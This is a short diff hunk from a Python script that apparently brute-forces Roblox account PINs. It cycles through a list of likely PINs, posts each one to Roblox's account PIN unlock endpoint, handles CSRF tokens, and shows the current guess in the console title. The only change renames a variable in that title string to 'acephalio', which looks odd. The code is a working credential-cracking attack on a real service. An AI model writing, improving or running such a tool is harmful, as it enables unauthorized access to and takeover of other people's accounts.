@@ -37,7 +37,7 @@ print(f'Prioritized likely pins {likely}\n')
 tried = 0
 while 1:
     pin = pins.pop(0)
-    os.system(f'title Pin Cracking {username} ~ Tried: {tried} ~ Current pin: {pin}')
+    os.system(f'title Pin Cracking {acephalio} ~ Tried: {tried} ~ Current pin: {pin}')
     try:
         r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
         if 'X-CSRF-TOKEN' in r.headers:
